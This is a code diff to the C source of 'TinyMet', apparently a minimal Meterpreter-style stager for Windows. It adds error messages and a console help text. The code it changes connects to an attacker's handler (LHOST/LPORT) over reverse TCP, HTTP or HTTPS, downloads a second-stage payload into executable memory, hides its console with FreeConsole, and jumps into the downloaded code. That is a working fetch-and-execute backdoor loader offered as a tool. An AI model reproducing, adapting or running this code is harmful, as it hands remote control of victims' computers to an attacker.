@@ -1,6 +1,7 @@
 #include <WinSock2.h>
 #include <Windows.h>
 #include <Wininet.h>
+#include <stdio.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
@@ -13,9 +14,10 @@ unsigned int bufSize;
 
 
 // Functions ...
-//void err_exit(int error){
-//
-//}
+void err_exit(char* message){
+	printf("Will exit, Error: %s", message);
+	exit(-1);
+}
 void gen_random(char *s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
 	static const char alphanum[] =
 		"0123456789"
@@ -49,13 +51,13 @@ unsigned char* rev_tcp(char* host, char* port)
 	int length = 0;
 
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
-		exit(1);
+		err_exit("WSAStartup");
 	}
 
 	hostName = gethostbyname(host);
 
 	if (hostName == nullptr){
-		exit(2);
+		err_exit("gethostbyname");
 	}
 
 	uIP = *(unsigned long*)hostName->h_addr_list[0];
@@ -67,11 +69,11 @@ unsigned char* rev_tcp(char* host, char* port)
 
 	sckt = socket(AF_INET, SOCK_STREAM, NULL);
 	if (sckt == INVALID_SOCKET){
-		exit(3);
+		err_exit("socket()");
 	}
 
 	if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
-		exit(4);
+		err_exit("connect()");
 	}
 
 	recv(sckt, (char*)&bufSize, 4, 0);
@@ -138,19 +140,19 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
 	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);;
 	if (hInternetOpen == NULL){
-		exit(201);
+		err_exit("InternetOpen()");
 	}
 
 	// 3.2: InternetConnect
 	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	if (hInternetConnect == NULL){
-		exit(202);
+		err_exit("InternetConnect()");
 	}
 
 	// 3.3: HttpOpenRequest
 	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
 	if (hHTTPOpenRequest == NULL){
-		exit(203);
+		err_exit("HttpOpenRequest()");
 	}
 
 	// 3.4: if (SSL)->InternetSetOption 
@@ -162,7 +164,7 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	// 3.5: HttpSendRequest 
 	if (!HttpSendRequest(hHTTPOpenRequest, NULL, NULL, NULL, NULL))
 	{
-		exit(204);
+		err_exit("HttpSendRequest()");
 	}
 
 	// 3.6: VirtualAlloc enough memory for the stage ... 4MB are more than enough
@@ -202,30 +204,31 @@ char* WcharToChar(wchar_t* orig){
 //	return wcstring;
 //}
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow)
+int main()
 {
 	LPWSTR *szArglist;
 	int nArgs;
+	char helpText[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
+		"Usage: tinymet.exe [transport] LHOST LPORT\n"
+		"Available transports are as follows:\n"
+		"    0: reverse_tcp\n"
+		"    1: reverse_http\n"
+		"    2: reverse_https\n"
+		"\nExample:\n \"tinymet.exe 2 handler.com 443\"\nwill use reverse_https and connect to host.com:443\n";
 
 	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
 
 	// rudimentary error checking
 	if (NULL == szArglist) { // problem parsing?
-		exit(100);
+		err_exit("CommandLineToArgvW & GetCommandLineW");
 	}
 	else if (nArgs == 2 && !wcscmp(szArglist[1], L"--help")){ // looking for help?
-		char helpText[] = "TinyMet v0.1 - Visit www.tinymet.com for more info.\n\n"
-			"Usage: tinymet.exe [transport] LHOST LPORT\n\n"
-			"Available transports are as follows:\n"
-			"    0: reverse_tcp\n"
-			"    1: reverse_http\n"
-			"    2: reverse_https\n"
-			"\nExample:\n \"tinymet.exe 2 handler.com 443\"\nwill use reverse_https and connect to host.com:443";
-		MessageBox(NULL, helpText, "TinyMet help", MB_OK);
+		printf(helpText);
 		exit(-1);
 	}
 	else if (nArgs != 4){ // less than 4 args?
-		exit(101);
+		printf(helpText);
+		err_exit("Invalid arguments count, should be 4");
 	}
 
 	// convert wchar_t to mb
@@ -245,10 +248,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		buf = rev_http(LHOST, LPORT, TRUE);
 		break;
 	default:
-		exit(102); // transport is not 0,1 or 2
+		printf(helpText);
+		err_exit("Transport should be 0,1 or 2"); // transport is not 0,1 or 2
 	}
-
+	FreeConsole();
 	(*(void(*)())buf)();
-	exit(0);
+	err_exit(0);
 }
 
